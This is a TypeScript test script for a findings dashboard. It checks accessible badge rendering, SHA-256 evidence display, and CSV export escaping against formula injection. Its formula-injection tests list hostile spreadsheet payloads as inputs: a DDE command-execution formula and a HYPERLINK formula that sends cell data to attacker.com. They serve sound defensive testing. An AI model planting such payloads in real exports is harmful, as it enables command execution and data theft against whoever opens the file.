import * as React from 'react';
import * as ReactDOMServer from 'react-dom/server';
import { SeverityBadge } from '../../apps/web/src/components/findings/severity-badge';
import { ConfidenceBadge } from '../../apps/web/src/components/findings/confidence-badge';
import { CleanCoreBadge } from '../../apps/web/src/components/findings/clean-core-badge';
import { FindingDetailRow } from '../../apps/web/src/components/findings/finding-detail-row';
import { escapeCsvCell } from '../../apps/web/src/lib/export';
import { Finding, Severity, ConfidenceClass } from '@erppreflight/schemas';

interface TestResult {
  suite: string;
  name: string;
  passed: boolean;
  error?: string;
  details?: unknown;
}

const results: TestResult[] = [];

function assert(condition: boolean, suite: string, name: string, details?: unknown) {
  if (condition) {
    results.push({ suite, name, passed: true, details });
  } else {
    results.push({ suite, name, passed: false, error: 'Assertion failed', details });
    console.error(`[FAIL] ${suite} -> ${name}`, details);
  }
}

// ============================================================================
// SUITE 1: Non-Color Accessibility Across All Severities & Badges
// ============================================================================
console.log('--- RUNNING SUITE 1: Non-Color Accessibility ---');

const SEVERITIES: Severity[] = ['BLOCKER', 'CRITICAL', 'MAJOR', 'MEDIUM', 'MINOR', 'LOW', 'INFO'];
const EXPECTED_LABELS: Record<Severity, string> = {
  BLOCKER: 'Blocker',
  CRITICAL: 'Critical',
  MAJOR: 'Major',
  MEDIUM: 'Medium',
  MINOR: 'Minor',
  LOW: 'Low',
  INFO: 'Info',
};

for (const sev of SEVERITIES) {
  const html = ReactDOMServer.renderToStaticMarkup(
    React.createElement(SeverityBadge, { severity: sev })
  );

  // 1. Must have role="status"
  assert(html.includes('role="status"'), 'Suite 1 (Severity)', `${sev} has role="status"`);

  // 2. Must have explicit aria-label with non-color severity label
  const expectedAria = `aria-label="Severity: ${EXPECTED_LABELS[sev]}"`;
  assert(html.includes(expectedAria), 'Suite 1 (Severity)', `${sev} has valid aria-label (${expectedAria})`);

  // 3. Must have non-empty textual content matching label
  const expectedSpan = `<span>${EXPECTED_LABELS[sev]}</span>`;
  assert(html.includes(expectedSpan), 'Suite 1 (Severity)', `${sev} has visible text label (${expectedSpan})`);

  // 4. Must render SVG icon with aria-hidden="true" (for screen reader non-duplication)
  assert(html.includes('<svg') && html.includes('aria-hidden="true"'), 'Suite 1 (Severity)', `${sev} renders SVG icon with aria-hidden="true"`);

  // 5. Must have distinctive styling classes
  assert(html.includes('rounded-full'), 'Suite 1 (Severity)', `${sev} has badge styling`);
}

// Test showIcon = false
const htmlNoIcon = ReactDOMServer.renderToStaticMarkup(
  React.createElement(SeverityBadge, { severity: 'BLOCKER', showIcon: false })
);
assert(!htmlNoIcon.includes('<svg'), 'Suite 1 (Severity)', 'showIcon=false omits SVG');
assert(htmlNoIcon.includes('<span>Blocker</span>'), 'Suite 1 (Severity)', 'showIcon=false retains text');
assert(htmlNoIcon.includes('aria-label="Severity: Blocker"'), 'Suite 1 (Severity)', 'showIcon=false retains aria-label');

// Test size="sm" vs default
const htmlSm = ReactDOMServer.renderToStaticMarkup(
  React.createElement(SeverityBadge, { severity: 'CRITICAL', size: 'sm' })
);
assert(htmlSm.includes('size-3') && htmlSm.includes('text-[11px]'), 'Suite 1 (Severity)', 'size="sm" applies compact dimensions');

const htmlDef = ReactDOMServer.renderToStaticMarkup(
  React.createElement(SeverityBadge, { severity: 'CRITICAL', size: 'default' })
);
assert(htmlDef.includes('size-3.5') && htmlDef.includes('text-xs'), 'Suite 1 (Severity)', 'size="default" applies standard dimensions');

// Test fallback for unknown severity string
const htmlFallbackSev = ReactDOMServer.renderToStaticMarkup(
  React.createElement(SeverityBadge, { severity: 'UNKNOWN_VAL' as Severity })
);
assert(htmlFallbackSev.includes('<span>Info</span>'), 'Suite 1 (Severity)', 'Unknown severity falls back to Info label');
assert(htmlFallbackSev.includes('aria-label="Severity: Info"'), 'Suite 1 (Severity)', 'Unknown severity falls back to Info aria-label');

// Test ConfidenceBadge across all 4 provenance classes
const CONFIDENCE_CLASSES: ConfidenceClass[] = ['VERIFIED', 'RULE_DERIVED', 'INFERRED', 'UNKNOWN'];
const EXPECTED_CONF_LABELS: Record<ConfidenceClass, { label: string; defaultScore: string }> = {
  VERIFIED: { label: 'Verified', defaultScore: '1.0' },
  RULE_DERIVED: { label: 'Rule Derived', defaultScore: '0.85' },
  INFERRED: { label: 'Inferred', defaultScore: '0.60' },
  UNKNOWN: { label: 'Unknown', defaultScore: '0.30' },
};

for (const conf of CONFIDENCE_CLASSES) {
  const { label, defaultScore } = EXPECTED_CONF_LABELS[conf];
  const html = ReactDOMServer.renderToStaticMarkup(
    React.createElement(ConfidenceBadge, { confidence: conf })
  );

  // 1. Must have role="status"
  assert(html.includes('role="status"'), 'Suite 1 (Confidence)', `${conf} has role="status"`);

  // 2. Must have informative aria-label including trust score
  const expectedAria = `aria-label="Confidence: ${label}, Trust Score: ${defaultScore}"`;
  assert(html.includes(expectedAria), 'Suite 1 (Confidence)', `${conf} has aria-label with score (${expectedAria})`);

  // 3. Must have visible textual label
  assert(html.includes(`<span>${label}</span>`), 'Suite 1 (Confidence)', `${conf} has visible label`);

  // 4. Must display trust score in text
  assert(html.includes(`(${defaultScore})`), 'Suite 1 (Confidence)', `${conf} displays score (${defaultScore})`);

  // 5. Must render SVG icon with aria-hidden="true"
  assert(html.includes('<svg') && html.includes('aria-hidden="true"'), 'Suite 1 (Confidence)', `${conf} renders SVG icon`);
}

// Test ConfidenceBadge with explicit score
const htmlExplicitScore = ReactDOMServer.renderToStaticMarkup(
  React.createElement(ConfidenceBadge, { confidence: 'VERIFIED', score: 0.95 })
);
assert(htmlExplicitScore.includes('(0.95)'), 'Suite 1 (Confidence)', 'Explicit score 0.95 formatted to 2 decimals');
assert(htmlExplicitScore.includes('Trust Score: 0.95'), 'Suite 1 (Confidence)', 'Explicit score reflected in aria-label');

// Test CleanCoreBadge
const htmlTier1 = ReactDOMServer.renderToStaticMarkup(
  React.createElement(CleanCoreBadge, { tier: 'TIER_1_CLOUD' })
);
assert(htmlTier1.includes('Tier 1 Cloud'), 'Suite 1 (CleanCore)', 'Tier 1 Cloud rendered');
assert(htmlTier1.includes('role="status"'), 'Suite 1 (CleanCore)', 'CleanCore has role="status"');
assert(htmlTier1.includes('Clean Core: Tier 1 Cloud'), 'Suite 1 (CleanCore)', 'CleanCore has accessible aria-label');

const htmlTierNull = ReactDOMServer.renderToStaticMarkup(
  React.createElement(CleanCoreBadge, { tier: undefined })
);
assert(htmlTierNull.includes('—'), 'Suite 1 (CleanCore)', 'Undefined tier displays fallback em dash');


// ============================================================================
// SUITE 2: Cryptographic Evidence Formatting in finding-detail-row.tsx
// ============================================================================
console.log('--- RUNNING SUITE 2: Cryptographic Evidence Formatting ---');

const baseFinding: Finding = {
  id: 'finding-test-001',
  projectId: 'proj-123',
  ruleId: 'TEST_RULE_CRYPTO_01',
  engineType: 'OPD_GUARD',
  severity: 'CRITICAL',
  confidence: 'VERIFIED',
  confidenceScore: 0.95,
  title: 'Direct Database Mutation in BRF+ Decision Table',
  description: 'Detected unauthorized DB update violating Clean Core Tier 1 compliance.',
  remediation: 'Replace direct DB mutation with SAP standard RAP business object actions.',
  category: 'OUTPUT_MANAGEMENT',
  affectedObjects: [
    { name: 'ZCL_OPD_DETERMINATION', type: 'CLAS', tier: 'TIER_3_CLASSIC' },
  ],
  evidence: [],
};

// 1. Test empty evidence fallback
const htmlEmptyEvidence = ReactDOMServer.renderToStaticMarkup(
  React.createElement(FindingDetailRow, { finding: { ...baseFinding, evidence: [] } })
);
assert(
  htmlEmptyEvidence.includes('No raw snippet evidence attached to this rule assertion.'),
  'Suite 2 (Evidence)',
  'Empty evidence renders informative fallback'
);

// 2. Test SHA-256 validation regex /^[a-fA-F0-9]{64}$/
const validSha256Lower = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
const validSha256Upper = 'E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855';
const validSha256Mixed = 'E3b0C44298fc1c149Afbf4c8996fb92427ae41E4649b934ca495991b7852B855';

const findingWithValidLower: Finding = {
  ...baseFinding,
  evidence: [{
    artifactPath: 'src/zcl_opd_determination.clas.abap',
    lineNumber: 142,
    columnNumber: 8,
    snippet: 'UPDATE zopd_table SET status = @lv_status.',
    sha256: validSha256Lower,
  }],
};

const htmlValidLower = ReactDOMServer.renderToStaticMarkup(
  React.createElement(FindingDetailRow, { finding: findingWithValidLower })
);
assert(htmlValidLower.includes('Verified Hash'), 'Suite 2 (Evidence)', 'Valid 64-char lowercase hex marks "Verified Hash"');
assert(htmlValidLower.includes('Line 142:8'), 'Suite 2 (Evidence)', 'Displays Line 142:8 correctly');
assert(htmlValidLower.includes('UPDATE zopd_table SET status = @lv_status.'), 'Suite 2 (Evidence)', 'Renders snippet code');
assert(htmlValidLower.includes(validSha256Lower), 'Suite 2 (Evidence)', 'Renders full SHA-256 hash');
assert(htmlValidLower.includes('Copy SHA-256 Hash'), 'Suite 2 (Evidence)', 'Provides copy button with aria-label');

// Test uppercase and mixed-case SHA-256
const htmlValidUpper = ReactDOMServer.renderToStaticMarkup(
  React.createElement(FindingDetailRow, {
    finding: {
      ...baseFinding,
      evidence: [{
        artifactPath: 'src/test.abap',
        lineNumber: 10,
        sha256: validSha256Upper,
      }],
    },
  })
);
assert(htmlValidUpper.includes('Verified Hash'), 'Suite 2 (Evidence)', 'Valid 64-char uppercase hex marks "Verified Hash"');
assert(htmlValidUpper.includes('Line 10'), 'Suite 2 (Evidence)', 'Line 10 without column renders "Line 10"');

// Test invalid SHA-256 hashes
const invalidHashes = [
  { val: 'e3b0c44298fc1c14', reason: 'Short 16-char' },
  { val: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b85', reason: 'Truncated 63-char' },
  { val: validSha256Lower + 'a', reason: 'Too long 65-char' },
  { val: 'g3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', reason: 'Non-hex character "g"' },
  { val: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b8 z', reason: 'Contains space and "z"' },
  { val: '', reason: 'Empty string' },
];

for (const { val, reason } of invalidHashes) {
  const htmlInvalid = ReactDOMServer.renderToStaticMarkup(
    React.createElement(FindingDetailRow, {
      finding: {
        ...baseFinding,
        evidence: [{
          artifactPath: 'src/invalid.abap',
          lineNumber: 5,
          sha256: val,
        }],
      },
    })
  );
  assert(
    htmlInvalid.includes('Unverified Hash') && !htmlInvalid.includes('Verified Hash'),
    'Suite 2 (Evidence)',
    `Invalid SHA-256 (${reason}) marks "Unverified Hash"`
  );
}

// Line / Column boundaries
const htmlLineOnly = ReactDOMServer.renderToStaticMarkup(
  React.createElement(FindingDetailRow, {
    finding: {
      ...baseFinding,
      evidence: [{
        artifactPath: 'src/test.abap',
        lineNumber: 50,
        columnNumber: undefined,
        sha256: validSha256Lower,
      }],
    },
  })
);
assert(htmlLineOnly.includes('Line 50') && !htmlLineOnly.includes('Line 50:'), 'Suite 2 (Evidence)', 'Undefined columnNumber displays "Line 50" without trailing colon');

const htmlLineZero = ReactDOMServer.renderToStaticMarkup(
  React.createElement(FindingDetailRow, {
    finding: {
      ...baseFinding,
      evidence: [{
        artifactPath: 'src/test.abap',
        lineNumber: 0,
        columnNumber: 1,
        sha256: validSha256Lower,
      }],
    },
  })
);
assert(htmlLineZero.includes('Line 0:1'), 'Suite 2 (Evidence)', 'Line 0:1 displays Line 0:1');

const htmlNoLine = ReactDOMServer.renderToStaticMarkup(
  React.createElement(FindingDetailRow, {
    finding: {
      ...baseFinding,
      evidence: [{
        artifactPath: 'src/test.abap',
        lineNumber: undefined,
        columnNumber: 5,
        sha256: validSha256Lower,
      }],
    },
  })
);
assert(!htmlNoLine.includes('Line '), 'Suite 2 (Evidence)', 'Undefined lineNumber renders no line indicator');


// ============================================================================
// SUITE 3: CSV Export Resilience (RFC 4180, UTF-8 BOM, CWE-1236)
// ============================================================================
console.log('--- RUNNING SUITE 3: CSV Export Resilience ---');

// 1. CWE-1236 Formula Injection Neutralization tests
const injectionTestCases = [
  { input: '=1+1', expectedChar: '=', desc: 'Formula starting with =' },
  { input: '+1+1', expectedChar: '+', desc: 'Formula starting with +' },
  { input: '-100', expectedChar: '-', desc: 'Negative number / formula starting with -' },
  { input: '@SUM(A1:B10)', expectedChar: '@', desc: 'Formula starting with @' },
  { input: '\tmalicious_tab', expectedChar: '\t', desc: 'Starting with horizontal tab' },
  { input: '\rmalicious_cr', expectedChar: '\r', desc: 'Starting with carriage return' },
  { input: '=cmd|"/C calc"!A0', expectedChar: '=', desc: 'DDE execution payload with quotes' },
  { input: '=HYPERLINK("http://attacker.com?leak=" & A1, "Error")', expectedChar: '=', desc: 'Hyperlink exfiltration attack with quotes' },
];

for (const { input, expectedChar, desc } of injectionTestCases) {
  const escaped = escapeCsvCell(input);
  // Neutralized cell must start with "'" or if RFC 4180 quoted, with "\"'<char>"
  const isNeutralized = escaped.startsWith(`'${expectedChar}`) || escaped.startsWith(`"'${expectedChar}`);
  assert(
    isNeutralized,
    'Suite 3 (CWE-1236)',
    `${desc}: correctly prefixed with single quote (got ${JSON.stringify(escaped.slice(0, 15))})`
  );
}

// 2. RFC 4180 Quoting & Escaping tests
const rfcTestCases = [
  {
    input: 'Simple text',
    expected: 'Simple text',
    desc: 'Plain text without special characters remains unquoted',
  },
  {
    input: 'Text, with comma',
    expected: '"Text, with comma"',
    desc: 'Text with comma is enclosed in double quotes',
  },
  {
    input: 'Text with "double quotes"',
    expected: '"Text with ""double quotes"""',
    desc: 'Text with quotes has quotes doubled and is enclosed in double quotes',
  },
  {
    input: 'Multi\nLine\nText',
    expected: '"Multi\nLine\nText"',
    desc: 'Text with newline is enclosed in double quotes',
  },
  {
    input: 'Multi\r\nLine\r\nText',
    expected: '"Multi\r\nLine\r\nText"',
    desc: 'Text with CRLF is enclosed in double quotes',
  },
  {
    input: 'Mixed: "Hello", said Bob.\nNew line.',
    expected: '"Mixed: ""Hello"", said Bob.\nNew line."',
    desc: 'Mixed quotes, commas, and newlines',
  },
  {
    input: null,
    expected: '',
    desc: 'null returns empty string',
  },
  {
    input: undefined,
    expected: '',
    desc: 'undefined returns empty string',
  },
  {
    input: 12345,
    expected: '12345',
    desc: 'Positive integer returns string as-is',
  },
  {
    input: { key: 'value', count: 42 },
    expected: '"{""key"":""value"",""count"":42}"',
    desc: 'Object serialized to JSON and RFC 4180 escaped',
  },
];

for (const { input, expected, desc } of rfcTestCases) {
  const result = escapeCsvCell(input);
  assert(
    result === expected,
    'Suite 3 (RFC 4180)',
    `${desc} (expected ${JSON.stringify(expected)}, got ${JSON.stringify(result)})`
  );
}

// 3. UTF-8 BOM verification on complete export simulation
function simulateCsvExport(records: Record<string, unknown>[]): string {
  if (records.length === 0) {
    return '\uFEFF';
  }
  const headers = Object.keys(records[0]);
  const rowsContent = records.map((item) =>
    headers.map((h) => escapeCsvCell(item[h])).join(',')
  );
  return '\uFEFF' + [headers.map(escapeCsvCell).join(','), ...rowsContent].join('\r\n');
}

const emptyExport = simulateCsvExport([]);
assert(emptyExport === '\uFEFF', 'Suite 3 (BOM)', 'Empty CSV export contains UTF-8 BOM');
assert(emptyExport.charCodeAt(0) === 0xfeff, 'Suite 3 (BOM)', 'UTF-8 BOM code point is 0xFEFF');

const sampleFindings = [
  {
    ruleId: 'OPD_001',
    title: 'Output Determination Missing',
    severity: 'BLOCKER',
    confidence: 'VERIFIED',
    score: 1.0,
    formulaField: '=1+1',
    description: 'Line 1, Line 2\nLine 3 with "quotes"',
  },
  {
    ruleId: 'CLEAN_CORE_002',
    title: 'Classic DB Mutation',
    severity: 'CRITICAL',
    confidence: 'RULE_DERIVED',
    score: 0.85,
    formulaField: '+4912345678',
    description: 'Direct table modification: @TABLE',
  },
];

const fullCsv = simulateCsvExport(sampleFindings);
assert(fullCsv.startsWith('\uFEFF'), 'Suite 3 (BOM)', 'Full CSV export begins with UTF-8 BOM');
assert(fullCsv.includes('\r\n'), 'Suite 3 (RFC 4180)', 'Rows delimited by CRLF (\\r\\n)');
assert(fullCsv.includes("'=1+1"), 'Suite 3 (CWE-1236)', 'Formula =1+1 neutralized with single quote');
assert(fullCsv.includes("'+4912345678"), 'Suite 3 (CWE-1236)', 'Phone/formula +4912345678 neutralized with single quote');
assert(fullCsv.includes('"Line 1, Line 2\nLine 3 with ""quotes"""'), 'Suite 3 (RFC 4180)', 'Multiline quote/comma cell correctly escaped');


// ============================================================================
// SUITE 4: End-to-End RFC 4180 Parser Verification (Round-trip Integrity)
// ============================================================================
console.log('--- RUNNING SUITE 4: CSV Round-trip Integrity ---');

// Parse RFC 4180 CSV back into fields to verify that escaping didn't corrupt the data
function parseCsvSimple(csvText: string): string[][] {
  const text = csvText.startsWith('\uFEFF') ? csvText.slice(1) : csvText;
  const rows: string[][] = [];
  let currentRow: string[] = [];
  let currentField = '';
  let inQuotes = false;
  let i = 0;

  while (i < text.length) {
    const char = text[i];

    if (inQuotes) {
      if (char === '"') {
        if (i + 1 < text.length && text[i + 1] === '"') {
          currentField += '"';
          i += 2;
          continue;
        } else {
          inQuotes = false;
          i++;
          continue;
        }
      } else {
        currentField += char;
        i++;
        continue;
      }
    } else {
      if (char === '"') {
        inQuotes = true;
        i++;
        continue;
      } else if (char === ',') {
        currentRow.push(currentField);
        currentField = '';
        i++;
        continue;
      } else if (char === '\r') {
        if (i + 1 < text.length && text[i + 1] === '\n') {
          currentRow.push(currentField);
          currentField = '';
          rows.push(currentRow);
          currentRow = [];
          i += 2;
          continue;
        }
        i++;
        continue;
      } else if (char === '\n') {
        currentRow.push(currentField);
        currentField = '';
        rows.push(currentRow);
        currentRow = [];
        i++;
        continue;
      } else {
        currentField += char;
        i++;
        continue;
      }
    }
  }

  if (currentField.length > 0 || currentRow.length > 0) {
    currentRow.push(currentField);
    rows.push(currentRow);
  }

  return rows;
}

const parsed = parseCsvSimple(fullCsv);
assert(parsed.length === 3, 'Suite 4 (Round-trip)', `Parsed exactly 3 rows (1 header + 2 data), got ${parsed.length}`);
assert(parsed[0].length === 7, 'Suite 4 (Round-trip)', `Header has 7 columns, got ${parsed[0].length}`);
assert(parsed[1][0] === 'OPD_001', 'Suite 4 (Round-trip)', 'Row 1 ruleId preserved');
assert(parsed[1][5] === "'=1+1", 'Suite 4 (Round-trip)', 'Row 1 formula sanitized as text');
assert(
  parsed[1][6] === 'Line 1, Line 2\nLine 3 with "quotes"',
  'Suite 4 (Round-trip)',
  'Row 1 complex description restored exactly with quotes and newlines'
);


// ============================================================================
// SUMMARY REPORT
// ============================================================================
console.log('\n======================================================');
console.log('                 TEST RESULTS SUMMARY                 ');
console.log('======================================================');

const passedCount = results.filter((r) => r.passed).length;
const failedCount = results.filter((r) => !r.passed).length;

console.log(`Total tests run: ${results.length}`);
console.log(`Passed: ${passedCount}`);
console.log(`Failed: ${failedCount}`);

if (failedCount > 0) {
  console.error('\nFAILURES:');
  for (const r of results.filter((r) => !r.passed)) {
    console.error(`- [${r.suite}] ${r.name}: ${r.error}`);
  }
  process.exit(1);
} else {
  console.log('\nALL EMPIRICAL TESTS PASSED WITH 100% SUCCESS RATE.');
  process.exit(0);
}
